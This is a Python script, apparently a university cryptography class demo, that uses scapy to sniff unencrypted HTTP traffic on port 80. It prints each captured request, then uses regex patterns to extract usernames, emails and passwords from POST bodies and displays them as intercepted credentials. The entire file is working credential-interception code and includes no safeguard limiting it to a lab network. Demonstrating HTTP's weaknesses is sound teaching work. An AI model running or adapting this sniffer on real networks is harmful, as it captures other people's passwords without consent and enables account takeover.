#!/usr/bin/env python3
"""
HTTP Interception Script - ALL Traffic Version
Intercepta TODO el tráfico HTTP incluyendo desde el host
"""

import sys
from scapy.all import sniff, TCP, Raw, IP, conf

try:
    from rich.console import Console
    from rich.panel import Panel
    console = Console()
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False


def extract_http_info(payload):
    """Extrae información HTTP del payload"""
    try:
        payload_str = payload.decode('utf-8', errors='ignore')
        
        if payload_str.startswith(('GET', 'POST', 'PUT', 'DELETE', 'HEAD')):
            lines = payload_str.split('\r\n')
            method_line = lines[0]
            headers = {}
            body = ''
            
            for i, line in enumerate(lines[1:], 1):
                if line == '':
                    body = '\r\n'.join(lines[i+1:])
                    break
                if ':' in line:
                    key, value = line.split(':', 1)
                    headers[key.strip()] = value.strip()
            
            return {
                'method_line': method_line,
                'headers': headers,
                'body': body
            }
    except:
        pass
    
    return None


def extract_credentials(body):
    """Extrae credenciales del body"""
    import re
    from urllib.parse import unquote
    
    credentials = {}
    patterns = [
        r'username=([^&\s]+)',
        r'user=([^&\s]+)',
        r'email=([^&\s]+)',
        r'password=([^&\s]+)',
        r'passwd=([^&\s]+)',
        r'pwd=([^&\s]+)',
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, body, re.IGNORECASE)
        if matches:
            key = pattern.split('=')[0].replace('r\'', '')
            credentials[key] = unquote(matches[0])
    
    return credentials if credentials else None


def packet_callback(packet):
    """Callback para cada paquete"""
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = packet[Raw].load
        http_info = extract_http_info(payload)
        
        if http_info:
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            method_line = http_info['method_line']
            
            # Mostrar TODOS los requests
            print(f"\n📡 HTTP Request")
            print(f"   {src_ip} → {dst_ip}")
            print(f"   {method_line}")
            
            # Si es POST, buscar credenciales
            if method_line.startswith('POST'):
                body = http_info.get('body', '')
                credentials = extract_credentials(body)
                
                if credentials:
                    if RICH_AVAILABLE:
                        console.print(Panel.fit(
                            f"[bold red]🔓 CREDENCIALES INTERCEPTADAS![/bold red]\n\n" +
                            "\n".join([f"[yellow]{k}:[/yellow] [red]{v}[/red]" for k, v in credentials.items()]),
                            border_style="red"
                        ))
                    else:
                        print("\n" + "="*60)
                        print("🔓 CREDENCIALES INTERCEPTADAS!")
                        for k, v in credentials.items():
                            print(f"  {k}: {v}")
                        print("="*60)


def main():
    print("\n" + "="*60)
    print("🕵️  HTTP INTERCEPTION - ALL TRAFFIC")
    print("Proyecto de Criptografía - UNAL Medellín")
    print("="*60)
    print("\n🎯 Interceptando TODO el tráfico HTTP...")
    print("   Incluyendo tráfico desde el host (tu navegador)")
    print("\n⚠️  Presiona Ctrl+C para detener\n")
    
    try:
        conf.verb = 0
        
        # Capturar en TODAS las interfaces
        sniff(
            filter="tcp port 80",
            prn=packet_callback,
            store=False
        )
        
    except KeyboardInterrupt:
        print("\n\n⚠️  Interceptación detenida")
    except Exception as e:
        print(f"\n❌ Error: {e}")


if __name__ == '__main__':
    main()
